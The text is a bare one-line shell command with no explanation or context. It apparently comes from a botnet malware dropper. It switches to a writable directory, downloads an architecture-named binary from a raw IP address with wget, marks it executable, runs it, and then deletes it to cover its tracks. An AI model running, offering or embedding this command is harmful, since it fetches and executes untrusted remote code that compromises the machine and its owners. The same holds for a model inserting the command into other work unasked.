cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.65.86/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
